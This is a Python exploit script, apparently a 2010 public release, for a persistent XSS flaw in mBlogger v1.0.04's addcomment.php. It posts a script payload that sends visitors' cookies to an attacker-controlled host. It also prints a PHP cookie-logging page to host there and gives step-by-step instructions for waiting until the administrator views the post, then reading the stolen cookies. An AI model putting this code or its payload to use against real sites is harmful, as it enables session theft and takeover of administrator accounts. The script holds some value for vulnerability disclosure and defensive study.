#!/usr/bin/python
#
# Exploit Title:   mBlogger v1.0.04 (addcomment.php) Persistent XSS Exploit
# Date         :   04 September 2010
# Author       :   Ptrace Security (Gianni Gnesa [gnix])
# Contact      :   research[at]ptrace-security[dot]com
# Software Link:   http://sourceforge.net/projects/mblogger/
# Version      :   1.0.04
# Tested on    :   EasyPHP 5.3.1.0 for Windows
#
#
# Description
# ===========
#
# + addcomment.php => An SQL Injection at line 32 allows to insert javascript
#                     that will be executed from the client's browser when he
#                     visits the page viewpost.php?postID=<number>.
#
# 29: $commentAuthor = $_POST['commentAuthor'];
# 30: $commentText = $_POST['commentText'];
# 31: $postID = $_GET['postID'];
# 32: $query = "INSERT INTO comments (user, comment, postid) VALUES
#     ('$commentAuthor', '$commentText', '$postID')";
# 33: if(!mysql_query($query, $connection))
# 34: {
# 35:    die("Error updating post: " . mysql_error());
# 36: }
#

import sys
import http.client
import urllib.parse


def fatal(message):
    print(message)
    exit(1)


def usage(program):
    print('Usage  : '+ program +' <victim> <mBlogger path> <attacker>\n')
    print('Example: '+ program +' localhost /mBlogger/ localhost')
    print('         '+ program +' www.victim.com /path/ www.attacker.com')
    return


def getRemotePHPCode():
    source  = '<?php\n'
    source += '$cs = explode("; ", $_GET[\'c\']);\n'
    source += '$fp = fopen(\'data.txt\',\'a\');\n'
    source += 'if(!empty($cs))\n'
    source += ' foreach($cs as $k => $v) {\n'
    source += '  if(preg_match("/^(.*?)\=(.*)$/", $v, $r))\n'
    source += '   fwrite($fp,urldecode($r[1])."=".urldecode($r[2])."\\r\\n");\n'
    source += '  else fwrite($fp, "cannot decode $v");\n'
    source += ' }\n'
    source += 'fclose($fp);\n'
    source += '?>'
    return source


def injectJavascript(victim, path, attacker):
    payload  = '<script>\nd=new Image;\nd.src=\"http://' + attacker
    payload += '/c.php?c=\"+escape(document.cookie);\n</script>\n'

    headers = {'Content-type':'application/x-www-form-urlencoded','Accept':'text/plain'}
    params  = urllib.parse.urlencode({'commentAuthor':'admin','commentText':payload,'submitcomment':'Submit'})
    con     = http.client.HTTPConnection(victim)

    con.request('POST', path + 'addcomment.php?postID=1', params, headers)
    res = con.getresponse()
    if res.status != 200:
        return False

    con.close()
    return True


def exploit(victim, path, attacker):
    print('[+] Injecting Javascript')
    success = injectJavascript(victim, path, attacker)
    if not success:
        fatal('[!] Injection failed')

    print('[+] Generating PHP code for malicious site\n')
    print(getRemotePHPCode() + '\n')

    print('[?] Instruction to use this exploit:')
    print('    1. Save the previous code in http://' + attacker + '/c.php')
    print('    2. Wait that the administrator visits ')
    print('       http://'+ victim +'/'+ path +'viewpost.php?postID=1')
    print('    3. Read stolen cookies from http://'+ attacker +'/' + 'data.txt')
    return



print('\n+-----------------------------------------------------------------------------+')
print('| mBlogger v1.0.04 (addcomment.php) Persistent XSS Exploit by Ptrace Security |')
print('+-----------------------------------------------------------------------------+\n')

if len(sys.argv) != 4:
   usage(sys.argv[0])
else:
   exploit(sys.argv[1],sys.argv[2], sys.argv[3])